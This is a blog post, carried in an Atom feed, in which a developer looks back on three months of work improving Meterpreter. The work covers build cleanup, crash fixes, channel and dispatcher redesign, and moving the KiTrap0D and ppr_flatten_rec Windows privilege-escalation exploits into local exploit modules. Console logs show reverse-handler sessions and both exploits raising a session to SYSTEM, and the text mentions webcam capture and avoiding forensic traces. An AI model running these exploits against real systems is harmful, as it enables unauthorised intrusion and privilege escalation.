<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Security | OJ's perspective]]></title>
  <link href="http://buffered.io/categories/security/atom.xml" rel="self"/>
  <link href="http://buffered.io/"/>
  <updated>2013-12-27T23:36:02+10:00</updated>
  <id>http://buffered.io/</id>
  <author>
    <name><![CDATA[OJ Reeves]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[3 Months of Meterpreter]]></title>
    <link href="http://buffered.io/posts/3-months-of-meterpreter/"/>
    <updated>2013-12-27T23:14:44+10:00</updated>
    <id>http://buffered.io/posts/3-months-of-meterpreter</id>
    <content type="html"><![CDATA[<p><img src="http://www.metasploit.com/revamp/images/metasploit-logo.png" style="float:right;margin-left:5px;margin-bottom:5px;"/>
In August this year I was fortunate enough to land a three-month contract working with the awesome people at <a href="http://www.rapid7.com/">Rapid7</a>. The job: <em>make <a href="https://github.com/rapid7/meterpreter">Meterpreter</a> more awesome on Windows</em>. That&rsquo;s right <em>more</em> awesome than it already is. Tough gig, but what an amazing opportunity!</p>

<p>Those three months have already come and gone, and what a ride it has been. In this post I would like to detail some of the work that has gone into Meterpreter, and Metasploit too, with a goal of helping others understand what it does and how it works. Ultimately, I&rsquo;d love to start seeing some contributions from the community now that it&rsquo;s <em>substantially</em> easier to build.</p>

<p>So, in a semi-chronological-semi-ad-hoc order, here&rsquo;s how Meterpreter has evolved.</p>

<!--more-->


<h2>A Whole New Build Environment</h2>

<p>Getting contributions from the Open Source community can be tricky enough, even when your build is clean and your development environment is very easy to get up and running. In the case of Meterpreter, <strong>neither</strong> of these things were true and hence anyone looking to contribute had to first negotiate the gauntlet of getting a functioning build environment configured.</p>

<p>My first task was to fix these problems. The immediate goal was to update the source so that it could be built with <a href="http://www.visualstudio.com/downloads/download-visual-studio-vs#d-express-windows-desktop">Visual C++ Express edition</a>. The Express editions of Microsoft&rsquo;s tools are free to download and use, and hence it would enable those who don&rsquo;t have a paid version of Visual Studio to build Meterpreter.</p>

<p>With that I embarked on the relatively simple job of updating projects, solutions and some areas of the source code. When I started this work, Visual Studio 2012 was the current version and hence that was the target to support. One of my first <a href="https://github.com/rapid7/meterpreter/pull/16">pull requests</a> to the Meterpreter repository was this upgrade, and thankfully it was very well received.</p>

<p>Then in typical fashion, just a couple of weeks after this work, Microsoft decides to release Visual Studio 2013! At first I didn&rsquo;t consider going through the upgrade process, but soon after I thought it best that the effort was made to bring our toolset up to the bleeding edge and the rest of the team agreed. So no long after, a <a href="https://github.com/rapid7/meterpreter/pull/41">new pull request</a> was submitted that brought things up to the latest and greatest.</p>

<h2>Clean Command Line Builds</h2>

<p>When I first tackled the Meterpreter build I saw two things that were just a little off-putting:</p>

<ol>
<li>There was one component, <a href="https://github.com/rapid7/meterpreter/tree/master/workspace/ext_server_sniffer">ext_server_sniffer</a>, which wouldn&rsquo;t build out of the box because of a missing dependency. This dependency, the packet sniffer SDK, is one that&rsquo;s available to Rapid7 employees only, due to licensing restrictions on the code. With this dependency missing, the build would finish with errors.</li>
<li>There were <em>lots</em> of warnings generated by the C++ compiler even when the build succeeded without errors. This was particularly bad in the case of the 64-bit build, for obvious reasons.</li>
<li>There was no way of building everything from the command line; it had to be built from within Visual Studio. This meant that having the build run under the context of something like <a href="http://jenkins-ci.org/">Jenkins</a> wasn&rsquo;t possible.</li>
</ol>


<p>I wanted to see these things go away so that all future contributors would see <code>0</code> errors <em>and</em> <code>0</code> warnings when the build completed. Needless to say, removing all the warnings wasn&rsquo;t a task that could be done overnight, but the error was definitely one that could be done.</p>

<p>I decided to solve the problem of the missing component by having different configurations baked into the projects. Meterpreter&rsquo;s solution contains the usual <code>Release</code> and <code>Debug</code> configurations that everyone is used to. It now also contains two new configurations called <code>r7_released</code> and <code>r7_debug</code>. The former two build all the projects <em>except</em> for the <code>ext_server_sniffer</code> extension, while the latter two include it. Anyone who works for Rapid7, that has access to the proprietary packet sniffer SDK, would be able to use the configurations prefixed with <code>r7_</code>. All other contributors would be able to use the configurations they&rsquo;re used to using. This does come with a little bit of confusion for the developer as they need to build with the correct configuration, but this is a small issue that can (and has) been fixed with documentation.</p>

<p>On the plus side, the command line build script is in the fortunate position of being able to detect the presence of the dependencies and choose which configuration to run. This means that it never results in an error.</p>

<p>So after a few weeks and lots of commits, I took the plunge and finalised the last of the issues with warnings, passed on a <a href="https://github.com/rapid7/meterpreter/pull/49">pull request</a> which the legendary <a href="https://twitter.com/_juan_vazquez_">Juan</a> landed, resulting in this &hellip;</p>

<p><img src="https://github-camo.global.ssl.fastly.net/55f4e2cf4419f90a802acb0f3ac3b4d87476ff02/687474703a2f2f692e696d6775722e636f6d2f6b5852523176482e706e67" alt="Clean Builds" /></p>

<p>Clean builds make for a happy OJ. And with that locked in, it was decided by the team that &ldquo;Treat warnings as errors&rdquo; would be turned on for each of the projetcs so that any future warnings would result in failed builds. This now helps us keep the build clean.</p>

<p>With all this in place, we&rsquo;re also able to constantly run <a href="https://ci.metasploit.com/job/MeterpreterWin/">CI builds for Meterpreter</a> when commits are made to <code>master</code> and when pull requests come in. This is really helping us keep things clean and gives us much quicker feedback on what might be wrong with the source base.</p>

<h2>Bug Fixes</h2>

<p>There are a few worthy mentions from the bug fix department that I&rsquo;d like to share with you.</p>

<h3>64-bit Pointer Truncation</h3>

<p>In some scenarios, on a 64-bit version of Windows, migration of Meterpreter would sometimes result in the session terminating unexpectedly. This rather intimidating bug was the first I attempted to fix when I joined the project, and I documented the analysis and resolution <a href="http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter/">in a previous blog post</a>, so if you&rsquo;re interested in the detail please have a read of that article. If you&rsquo;re too lazy, the TL;DR version is that 64-bit pointers were being truncated to 32-bit as a result of a bad function pointer type declaration. This wasn&rsquo;t an issue until recently because it appears that new versions of <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> have just started allocating above the 4GB boundary.</p>

<h3>Crashy Meterpreter with MS08-067</h3>

<p>Penetration testers all around the world have fallen in love with <a href="http://technet.microsoft.com/en-us/security/bulletin/ms08-067">MS08-067</a>, and rightly so. It has proved to be a very reliable exploit and has served the industry well. So imagine the dismay that some testers experienced when using the Meterpreter payload with this exploit on Windows XP (without any service packs) and seeing their session <strong>crash on startup</strong>. Horrible. The reason for this was due to Meterpreter attempting to enumerate NICs on the target box when first setting itself up. In Windows XP SP1 and onwards, certain parts of the Windows API had changed to allow for easier gathering of certain bits of information. Prior to this, it wasn&rsquo;t so easy. Bear in mind that Meterpreter doesn&rsquo;t really know anything about the system that it&rsquo;s running on so it attempts to figure it out as it goes. In this particular case it failed to properly detect the host operating system&rsquo;s capabilities and attempted to read invalid areas of memory. After much investigation, and a great deal of help from <a href="https://twitter.com/_juan_vazquez_">Juan</a> (again, who is legendary, I&rsquo;m not sure if I mentioned that), we <a href="https://github.com/rapid7/meterpreter/pull/21">landed a fix</a> for the problem, and there was much rejoicing.</p>

<h3>Multi-call Railgun failures</h3>

<p>The glory of <a href="http://www.room362.com/blog/2010/7/7/intro-to-railgun-win-api-for-meterpreter.html">Railgun</a> was slightly tarnished by a not-so-stable multi-call function which was causing crashes in Meterpreter sessions. A slight tweak of the code on both the <a href="https://github.com/rapid7/meterpreter/pull/28">Meterpreter side</a> and the <a href="https://github.com/rapid7/metasploit-framework/pull/2458">Metasploit side</a> resulted in this problem going away and allowing other modules to make better use of Railgun through a lower number of calls. Less chatty comms can only be a good thing.</p>

<h3>Sniffer Extension Fixes</h3>

<p>The <code>ext_server_sniffer</code> extension suffered from a bit of 64-bit hate. It had on a number of occasions crashed sessions under 64-bit and failed to run completely on newer versions of Windows. Some rework of the packet sniffer SDK, along with rebuilding binaries using the new toolchain, resulted in both of these problems disappearing.</p>

<h3>Deadly Webcam Snapshots</h3>

<p>A much-loved feature of Meterpreter is it&rsquo;s ability to take a snapshots from an attached webcam and download them to the attacker&rsquo;s machine. This nifty feature could sometimes result in crashy sessions, and nobody likes crashy sessions.</p>

<p>The reason this was happening was because of the way that webcam capture was implemented combined with the mechanism that Meterpreter uses to manage command execution. Each command that is executed in the context of Meterpreter is run on a separate thread. There are a few reasons for this which we won&rsquo;t go into now, but bear this mind while we dive into the webcam snapshot implementation.</p>

<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/webcam/webcam.rb">Webcam interaction</a> is controlled using three functions:</p>

<ol>
<li>Starting the webcam using <code>stdapi.webcam.webcam_start</code>.</li>
<li>Capturing a frame from the webcam using <code>stdapi.webcam.webcam_get_frame</code>.</li>
<li>Stopping the webcam using <code>stdapi.webcam.webcam_stop</code>.</li>
</ol>


<p>When the camera is &ldquo;started&rdquo;, Meterpreter fires up <a href="http://www.microsoft.com/com/default.mspx">COM</a> and uses a set of interfaces to manage camera initialisation and interaction. When the camera is stopped, these interface instances are destroyed and COM is shut down. The problem here is that COM needs to be initialised and shutdown <em>on the same thread</em>, and given that each command is executed on separate threads, COM got upset and sometimes died. The problem wasn&rsquo;t consistent, in that it worked on quite a few platforms and cameras, but not on others. I was only able to reproduce the problem with one camera on Vista x86.</p>

<p>The <a href="https://github.com/rapid7/meterpreter/pull/44">solution</a> was simple: we now have a separate thread of execution that we use to do all the webcam-related work on. Since this fix has been put in place we haven&rsquo;t seen any more webcam-related crashes on Windows!</p>

<h3>Meterpreter not Shutting Down</h3>

<p>When Meterpreter is launched from an executable generated using <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload">msfpayload</a>, the <code>exit</code> command would fail to actually terminate the process. This is obviously a bad thing as far as forensics goes, as leaving running processes behind leaves evidence of exploitation.</p>

<p>This bug has been half fixed. That is, the <code>reverse_tcp</code> and <code>bind_tcp</code> payloads now exit cleanly, but the <code>reverse_http</code> and <code>reverse_https</code> payloads still need work (we <em>will</em> get them fixed though). Lots of work had to go into finding a cleaner shutdown process from within Meterpreter, and that is covered in the &ldquo;Engine Room Improvements&rdquo; section of this post. The rest falls under the category of &ldquo;how do we fix the payloads&rdquo;, which will have to come in a later post once we&rsquo;ve solved the issue.</p>

<h3>Unstable Channels</h3>

<p>You might not know this, but every time you type <code>shell</code> into a Meterpreter prompt, you&rsquo;re opening a <em>channel</em>. When you download a file, you open a channel. Almost everything you do when you interact with Meterpreter results in a channel being opened. In some cases, such as when using <code>shell</code>, the channel persists for an extended period of time. Pressing <code>CTRL+Z</code> allows you to put such a channel into the background so that you can continue working with other Meterpreter features, after which you can bring the channel back into the foreground using the <code>channels</code> command.</p>

<p>Well, that&rsquo;s how it was supposed to work, but this was broken on both Windows and POSIX builds of Metepreter. The work required to fix this was quite in-depth, and hence is covered in the &ldquo;Engine Room Improvements&rdquo; section of this post.</p>

<h2>Engine Room Improvements</h2>

<p>Changes have come through in many forms from cosmetic to major heart surgery. This section covers some of the more gory details from the latter of these two categories.</p>

<h3>Improved Security</h3>

<p>The last thing that we&rsquo;d like to have happen to a Meterpreter use is for them to be owned by the victim during an attack. While this might be rather implausible, we decided to run through the source and make a point of addressing any potentially risky function calls. Prime candidates for refactoring include functions such as <a href="http://www.cplusplus.com/reference/cstring/strcpy/">strcpy</a>, the <a href="http://en.wikipedia.org/wiki/Honey_Badger_Don't_Care">Honey Badger</a> of the C standard library. We cleaned up a great deal of those <a href="https://github.com/rapid7/meterpreter/pull/32">in a single pull request</a> and on the whole Meterpreter became <em>much</em> more trustworthy.</p>

<h3>Command Dispatcher Surgery</h3>

<p>The notion of a &ldquo;command&rdquo; won&rsquo;t be new to anyone who has used Meterpreter before. Simply, a command is the context of a single instance of execution. It can wrap up a simple request/response call, such as <code>getpid</code>, which allows for execution of commands on the victim&rsquo;s machine. No rocket science there.</p>

<p>However, the implementation of the command mechanism had one limitation that forced a couple of issues to bubble to the surface:</p>

<ol>
<li>Every single command invoked in Meterpreter is executed on a separate thread. For the most part this is OK, and is what you want to have happen behind the scenes so that the main dispatcher thread doesn&rsquo;t block while waiting for potentially long-running commands to execute. However, there are times when the main dispatcher thread should be used instead.</li>
<li>There was no clean way to tell the main dispatcher thread to stop processing commands, and so shutting down cleanly wasn&rsquo;t as simple job. Instead it required signalling of events across threads which caused some interesting bugs to appear, particularly in POSIX.</li>
</ol>


<p>Instead of attempting to debug the problems that we were seeing, I decided to get the scalpel out and rework the command handling so that there were two modes of operation instead of just the one. At first I thought this change would be quick, but I soon realised there was a bit more to it.</p>

<p>The first thing I needed to do was to come up with a way of allowing individual commants to indicate whether they were to be executed on separate threads or not. At first I thought it&rsquo;d be useful to allow the attacker to tell Meterpreter on the fly, but I follow through with this idea because there&rsquo;s no only room for abuse, but the attacker isn&rsquo;t always the best judge of what should happen and on what thread it should happen on.</p>

<p>Commands already have two pointers to functions which perform the handling of requests and responses. These pointers of a type called <code>DISPATCH_ROUTINE</code> which is declared as follows:</p>

<p><code>cpp Definition of DISPATCH_ROUTINE https://github.com/rapid7/meterpreter/blob/master/source/common/base.h#L12
typedef DWORD (*DISPATCH_ROUTINE)(Remote *remote, Packet *packet);
</code></p>

<p>At first I felt that this would be easy to reuse for inline processing. However, after some thought, I went instead with the idea of an <code>INLINE_DISPATCH_ROUTINE</code> which has the following prototype:</p>

<p><code>cpp Definition of INLINE_DISPATCH_ROUTINE https://github.com/rapid7/meterpreter/blob/master/source/common/base.h#L13
typedef BOOL (*INLINE_DISPATCH_ROUTINE)(Remote *remote, Packet *packet, DWORD* result);
</code></p>

<p>The reasons I decided to do this are:</p>

<ol>
<li>It provides a definitive semantic separation of intent between something that&rsquo;s inline and something that is not.</li>
<li>I wanted the prototype to be reflective of the difference in meaning to the caller.</li>
<li>The inline dispatch routine needed to have a way of indicating to the calling thread that processing should cease or continue.</li>
</ol>


<p>The return value of the <code>INLINE_DISPATCH_ROUTINE</code> is a simple <code>BOOL</code> which says &ldquo;continue processing&rdquo; in the case of <code>TRUE</code> and &ldquo;stop processing&rdquo; in the case of <code>FALSE</code>. This simple return value makes it easy for the main dispatcher thread to check to see if a particular command has requested termination, as you can see from <a href="https://github.com/rapid7/meterpreter/blob/master/source/server/server_setup.c#L358">the updated body of the command dispatcher thread</a>. Having this in place meant that none of the commands required references to the server&rsquo;s state in order to have it terminated via a signal, and this itself preventing POSIX from segfaulting when exiting the process.</p>

<p>Of course, this change wasn&rsquo;t something that could be added in easily due to the nature of <code>Command</code> declarations. Instead of making a point of changing each and every command so that it catered for this new <code>INLINE_DISPATCH_ROUTINE</code>, I thought it best to take a semi-<a href="http://en.wikipedia.org/wiki/Microsoft_Foundation_Class_Library">MFC</a>-style approach and produce some macros which better indicate the intent of commands when they are declared. This was made more important by the fact that each command was getting another member, and hence the declaration of each would have to change.</p>

<p>Full details of these macros can be found in the <a href="https://github.com/rapid7/meterpreter/blob/master/source/common/base.h#L25">source code</a>, but to demonstrate the difference these make take a look at the difference between this:</p>

<p>``` cpp Old command declarations
Command custom_commands[] =
{</p>

<pre><code>{ "core_loadlib", 
    { request_core_loadlib,              { 0 }, 0 },
    { EMPTY_DISPATCH_HANDLER                      },
},

// Terminator
{ NULL,
    { EMPTY_DISPATCH_HANDLER                      },
    { EMPTY_DISPATCH_HANDLER                      },
},
</code></pre>

<p>};
```</p>

<p>and this:</p>

<p>``` cpp New command declarations
Command customCommands[] =
{</p>

<pre><code>COMMAND_REQ("core_loadlib", request_core_loadlib),
COMMAND_TERMINATOR
</code></pre>

<p>};
```</p>

<p>I hope you agree this does a better job of indicating intent and it also makes it harder to make mistakes, and it also hides the detail of implementation.</p>

<p>With these changes in place, I was then able to change the two main shutdown functions so that they use this new functionality. The two commands that close Meterpreter sessions down are <code>exit</code> and <code>migrate</code>, so those were both changed:</p>

<p>``` cpp Inline Request Declaration <a href="https://github.com/rapid7/meterpreter/blob/master/source/common/base.c#L75">https://github.com/rapid7/meterpreter/blob/master/source/common/base.c#L75</a>
Command base_commands[] =
{</p>

<pre><code>// ... snip ...
// Migration
COMMAND_INLINE_REQ("core_migrate", remote_request_core_migrate),
// Shutdown
COMMAND_INLINE_REQ("core_shutdown", remote_request_core_shutdown),
// ... snip ...
</code></pre>

<p>};
```</p>

<p>At this point Meterpreter shutdowns were more deterministic &hellip; at least for <code>reverse_tcp</code> payloads!</p>

<p>If you&rsquo;re interested in taking a look at the guts of the rework you can see it in <a href="https://github.com/rapid7/meterpreter/pull/34">this pull request</a>.</p>

<h3>Channel Surgery</h3>

<p>The core communication mechanism used by the internals of Meterpreter are called <em>channels</em>. A channel is a bit of an abstract concept, but effectively it&rsquo;s hard to do anything with Meterpreter without using one. If you execute a command from MSF to Meterpreter running on a victim&rsquo;s machine, you&rsquo;re using channels.</p>

<p>As you can imagine, the thought of mucking with this beauties strikes fear into any sane person. It should, however, be obvious that I lost all my sanity thanks to years of enterprise software development, and so the thought of tweaking the innards of channels didn&rsquo;t faze me at all.</p>

<p>A bug had been submitted to Redmine which indicated that in both Windows and POSIX Meterpreter was suffering from issues where channels were behaving incorrectly in various scenarios, including when put in the background. For the uninitiated, you can execute the <code>shell</code> command from within Meterpreter and end up with a native system shell; <code>/bin/bash</code> for POSIX and <code>cmd.exe</code> for Windows. You are then able to press <code>CTRL+Z</code> and MSF asks if you wish to background the channel, effectively putting it on ice while you do other things with Meterpreter (via other channels, HA!). To bring this channel back into the foreground, the <code>channels</code> command can be used with the <code>-i</code> switch. Another issue with this was that the processes running behind the backgrounded channels were left hanging, even when Meterpreter was closed. This obviously doesn&rsquo;t look good forensically.</p>

<p>At least, that&rsquo;s how it was supposed to happen. But the fact of the matter was that backgrounded channels were broken. Bringing them back into the foreground never worked. Best case, the channel would close, and you&rsquo;d end up back at the Meterpreter shell. Worst case, the entire Meterpreter session would crash, which was what happened most of the time on POSIX.</p>

<p>This was the issue that I was aiming to fix when I first started, and it turned out there were a few fundamental things that had to change to support it. To understand the problem, we need to take a look at the <code>scheduler</code> (cue the scary music). The <code>scheduler</code> is a bit of code that is responsible for managing the lifetime of channels (and a few other things) and for some reason the implementation for Windows was very different to POSIX, which to a point explained the differences we were seeing when testing.</p>

<p>For this discussion, we&rsquo;ll stick to Windows and to the interactive channels which are responsible for dealing with shells. When an interactive channel is created that is tied to a background shell process a bunch of things happen:</p>

<ol>
<li>A process is created which contains the shell, in this case <code>cmd.exe</code>.</li>
<li>Handles to <code>stdin</code> and <code>stdout</code> are acquired and stored alongside the channel.</li>
<li>A thread is created and the work for that channel is tied to the thread.</li>
<li>The scheduler is handed the detail of the channel so that the lifetime of the channel can be managed.</li>
</ol>


<p>A noteworthy exclusion to the captured metadata is the handle to the process being managed. As soon as the thread made it to the scheduler, the reference to the newly-created process was lost. At this point Meterpreter had no chance of correctly terminating processes automatically because it had no idea of which process to close. It might be able to be inferred in some cases, but it was impossible to infer in the general case.</p>

<p>The first thing I did was fix this small issue so that at any time, Meterpreter knew which process was being managed by which thread and which channel. This made it possible to close down any associated process at the correct time, such as Meterpreter shutting down or when the user terminates a channel via the <code>channels -c</code> command.</p>

<p>I then looked deeper into the scheduler&rsquo;s code and found that the management thread wasn&rsquo;t behaving as expected. Here&rsquo;s a summary of what it was doing:</p>

<ol>
<li>Extracting references to channel handles (which in our case would be the read handle for <code>stdout</code> and the thread&rsquo;s <code>sigterm</code> handle for when an external entity wanted to signal the closing of the channel).</li>
<li>Waiting on each of those handles until a system event indicated that one of them has had some activity. Think [WaitForMultipleObjects][] in the Win32 API.</li>
<li>When an event signal is received, the code would handle it, and either exit the loop if told to do so, or read data from the process&rsquo;s <code>stdout</code>.</li>
<li>Rinse and repeat until close.</li>
<li>On close, clean up all the thread context, the channel context, etc.</li>
</ol>


<p>In case it&rsquo;s not clear, there was something missing from this: there was no way to <em>suspend</em> the channel. When was happening when a channel was put in the background was that the loop was exited, and all the context was destroyed/closed. At this point it was not possible to bring it back.</p>

<p>To fix this problem, I changed a bunch of things:</p>

<ul>
<li>Channel&rsquo;s had more <em>stuff</em> added to their context:

<ul>
<li>An event handle for <em>suspension</em> requests.</li>
<li>An event handle for <em>resumption</em> requests.</li>
</ul>
</li>
<li>The scheduler thread loop waited on the suspension object as well as the original two.</li>
<li>When channels were backgrounded, the calling code signalled the <em>suspenction</em> event and continued on it&rsquo;s merry way. The scheduler would simply block and wait on the <em>resumption</em> event <strong>only</strong>. No channel context is destroyed at this point like it was before.</li>
<li>When the channel is to be brought into the foreground, the caller signals the <em>resumption</em> event and carries on as it did before. The scheduler receives this signal and then continues to wait, process and loop like it did before.</li>
<li>If a channel is terminated while suspended, the caller signals resumption prior to termination, so this means that the channel&rsquo;s scheduler thread doesn&rsquo;t hang.</li>
<li>When a channel is terminated, the process that is associated with the channel is also terminated.</li>
</ul>


<p>Once this work was done, I completely removed the old POSIX implementation and replaced it with this new one. It wasn&rsquo;t a smooth transition as I had to tweak a few other things, including the <a href="https://github.com/rapid7/meterpreter/pull/38/files#diff-9855cd942b30d41aeb1ac277daa18033R199">signalling code</a>. This was because on Windows we were using [AutoResetEvent][] objects, but POSIX wasn&rsquo;t behaving the same.</p>

<p>There were a few other issues with regards to competing threads cleaning things up when they shouldn&rsquo;t resulting in some threads terminating horribly periodically. This was also adjusted so that the termination and tidying were a little more deterministic (yes, I <a href="https://www.youtube.com/watch?v=G2y8Sx4B2Sk">keep using that word</a>).</p>

<p>The guts of the work can be found in <a href="https://github.com/rapid7/meterpreter/pull/38">this pull request</a>. There&rsquo;s actually not that much to it, but the nature of the changes were scary given that they messed with a pretty important part of the application.</p>

<p>Thankfully, so far, it would seem that this really has improved things, and Meterpreter has been a lot more stable in both POSIX and Windows since this was rolled into <code>master</code>. Thanks again to <a href="https://twitter.com/egyp7">Egypt</a> for his testing and landing of this one.</p>

<h2>Local exploits</h2>

<p>I wish I could claim that I had built these myself, but that would be dishonest. The work that I did with local exploits involved refactoring and moving them around. I hope that some point soon I&rsquo;ll actually contribute a whole <em>new</em> exploit built by me from the ground up.</p>

<h3>KiTrap0D</h3>

<p>This exploit is a gem from the mighty Tavis Ormandy, and was published in various places including the <a href="http://seclists.org/fulldisclosure/2010/Jan/341">Full Disclosure</a> mailing list a few years back.</p>

<p>The <a href="http://carnal0wnage.attackresearch.com/2010/01/kitrap0d-now-in-metasploit.html">first version</a> of the KiTrap0D exploit made it into Metasploit in the form of a Meterpreter script that was run once a session had been established. Over time it changed and moved, then ended up in the <code>getsystem</code> command thanks to some work by <a href="https://twitter.com/stephenfewer">Stephen Fewer</a>.</p>

<p>Many of us love <code>getsystem</code> and what it gives us, but not many of use really know how it works. Once Stephen had done his work, the <code>getsystem</code> command had <code>4</code> different methods in which to gain <code>SYSTEM</code> privileges. <code>3</code> of them were abusing various properties of Windows, and the last one (KiTrap0D) was an actual ring0 exploit. When <code>getsystem</code> is invoked without any parameters, Meterpreter loops through <em>all</em> of the existing methods to elevate and tries each one in order. It will keep trying until it either runs out of options, or one of the methods succeeds. The user can choose to use a single method by using the <code>-t</code> switch, but most of the time nobody bothers with that, as they don&rsquo;t really care which method works as long as they end up with elevated privileges.</p>

<p>Unfortunately, on later versions of Windows, the first few methods of elevation don&rsquo;t have the hit-rate they have on earlier versions. As a result, the <code>getsystem</code> call manages to try the KiTrap0d exploit quite a bit more, and this sometimes resulted in either broken sessions. It had also been known to <a href="http://en.wikipedia.org/wiki/Blue_Screen_of_Death">blue-screen</a> boxes too, which isn&rsquo;t a great look at all, and it&rsquo;s frustrating for the testers.</p>

<p>After discussing it with the team, it was decided that it should not be included as part of <code>getsystem</code> command, but instead be moved into a local exploit that can be invoked by the user if and when they want to.</p>

<p>Both <a href="https://github.com/rapid7/meterpreter/pull/51">Meterpreter</a> and <a href="https://github.com/rapid7/metasploit-framework/pull/2633">Metasploit</a> needed to be updated to accommodate this, but the result is really nice. Here&rsquo;s a sample run of the new exploit:</p>

<p>``` plain KiTrap0d Exploit in Action
msf exploit(handler) > exploit</p>

<p>[<em>] Started reverse handler on XX.XX.XX.40:8000
[</em>] Starting the payload handler&hellip;
[<em>] Sending stage (785920 bytes) to XX.XX.XX.43
[</em>] Meterpreter session 1 opened (XX.XX.XX.40:8000 &ndash;> XX.XX.XX.43:49234) at 2013-11-27 19:55:43 +1000</p>

<p>meterpreter > getuid
Server username: WIN-P73NLAJOYFH\OJ
meterpreter > background
[<em>] Backgrounding session 1&hellip;
msf exploit(handler) > use exploit/windows/local/ms10_015_kitrap0d
msf exploit(ms10_015_kitrap0d) > set session 1
session => 1
msf exploit(ms10_015_kitrap0d) > exploit
[</em>] Reloading module&hellip;</p>

<p>[<em>] Started reverse handler on XX.XX.XX.3:4444
[</em>] Launching notepad to host the exploit&hellip;
[+] Process 1288 launched.
[<em>] Reflectively injecting the exploit DLL into 1288&hellip;
[</em>] Exploit injected. Injecting payload into 1288&hellip;
[<em>] Payload injected. Executing exploit&hellip;
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[</em>] Sending stage (768512 bytes) to XX.XX.XX.3
[*] Meterpreter session 3 opened (XX.XX.XX.3:4444 &ndash;> XX.XX.XX.3:51569) at 2013-11-13 23:53:36 -0600</p>

<p>meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```</p>

<p>This was the first time I&rsquo;d ever worked with local exploits, and I won&rsquo;t deny that finishing it and seeing it all working made me feel like this:</p>

<p><img src="/uploads/2013/12/f-yeah.gif" alt="Yeah!" /></p>

<p>(Thanks to my good friend <a href="https://twitter.com/justinsteven">Justin</a> for showing me this image.)</p>

<p>This exploit doesn&rsquo;t mess with your existing session at all, so that should continue to function as before. This exploit also supports the use of different payload types, just like every other exploit, making it a little more flexible than when it was part of <code>getsystem</code>. If you&rsquo;re interested in seeing how the module works, take a look at <a href="https://github.com/OJ/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_015_kitrap0d.rb">the source on Github</a>.</p>

<p>After this change was merged, pentesters worldwide would rejoice in the fact that they could now resume normal <code>getsystem</code> programming instead of having to worry about sessions dying and machines crashing.</p>

<p>A big shout out goes to <a href="https://twitter.com/_sinn3r">sinn3r</a> and <a href="https://twitter.com/_juan_vazquez_">Juan</a> for helping get this over the line.</p>

<h3>ppr_flatten_rec</h3>

<p>While doing the work to refactor the <a href="http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf">Reflective DLL Injection</a> functionality into a <a href="http://git-scm.com/docs/git-submodule">git submodule</a>, allowing all exploits and Meterpreter itself to share the same codebase, I had to go through existing exploits and make sure they configured to use this new submodule. <code>ppr_flatten_rec</code> was one of the two that needed updating (the other was KiTrap0D).</p>

<p>This exploit is quite nifty, though due to the nature of what it does, it can also make target systems unstable. For example, on my Windows 7 x86 machine, this exploit almost always worked, but would also make the desktop totally unusable. However, on my Windows Vista SP2 x86 box, I rarely had problems.</p>

<p>The original version of this module elevated an existing session rather than doing what all good local exploits should do and create a new session post-elevation. So while I was refactoring for submodules I decided to fix this up as well. The <a href="https://github.com/rapid7/metasploit-framework/pull/2701">result</a> is a nicer local exploit that goes like this:</p>

<p>``` plain ppr_flatten_rec Exploit in Action
msf exploit(handler) > exploit</p>

<p>[<em>] Started reverse handler on XX.XX.XX.40:8000
[</em>] Starting the payload handler&hellip;
[<em>] Sending stage (785920 bytes) to XX.XX.XX.43
[</em>] Meterpreter session 1 opened (XX.XX.XX.40:8000 &ndash;> XX.XX.XX.43:49234) at 2013-11-27 19:55:43 +1000</p>

<p>meterpreter > getuid
Server username: WIN-P73NLAJOYFH\OJ
meterpreter > background
[*] Backgrounding session 1&hellip;
msf exploit(handler) > use exploit/windows/local/ppr_flatten_rec
msf exploit(ppr_flatten_rec) > set session 1
session => 1
msf exploit(ppr_flatten_rec) > exploit</p>

<p>[<em>] Started reverse handler on XX.XX.XX.40:4444
[</em>] Launching notepad to host the exploit&hellip;
[+] Process 3128 launched.
[<em>] Reflectively injecting the exploit DLL into 3128&hellip;
[</em>] Exploit injected. Injecting payload into 3128&hellip;
[<em>] Payload injected. Executing exploit&hellip;
[</em>] Exploit thread executing (can take a while to run), waiting 10 sec &hellip;
[<em>] Sending stage (785920 bytes) to XX.XX.XX.43
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[</em>] Meterpreter session 2 opened (XX.XX.XX.40:4444 &ndash;> XX.XX.XX.43:49235) at 2013-11-27 19:56:37 +1000</p>

<p>meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```</p>

<p>Another big shout out goes to <a href="https://twitter.com/_sinn3r">sinn3r</a> and <a href="https://twitter.com/_juan_vazquez_">Juan</a> for aiding in making my code less shitty.</p>

<h2>New Features</h2>

<p>Making Meterpreter more stable, less crashy and more reliable is always the focus of the work, but at the same time it&rsquo;s important to improve it&rsquo;s feature set, along with that of Metasploit itself. We&rsquo;ve had some nice new features and upgrades in the toolset and I&rsquo;d like to share a few of them here.</p>

<h3>IPv6 Addresses in ipconfig</h3>

<p>Work had already been done to make Windows render the IPv6 addresses on a victim machine, but there were a couple of things in the way of having them passed down to Metasploit when NICs were being parsed. [This pull request][ipv6_pr] adjusted things so that these addresses are included in the output.</p>

<p>Here&rsquo;s what it looks like on one of my Vista VMs:</p>

<p>```
meterpreter > ipconfig</p>

<h1>Interface  1</h1>

<p>Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</p>

<h1>Interface 10</h1>

<p>Name         : Intel&reg; PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:49:ae:13
MTU          : 1480
IPv4 Address : XX.XX.XX.52
IPv4 Netmask : 255.255.248.0
IPv6 Address : YYYY:YYYY:YYYY:0:5495:4239:4f53:7361
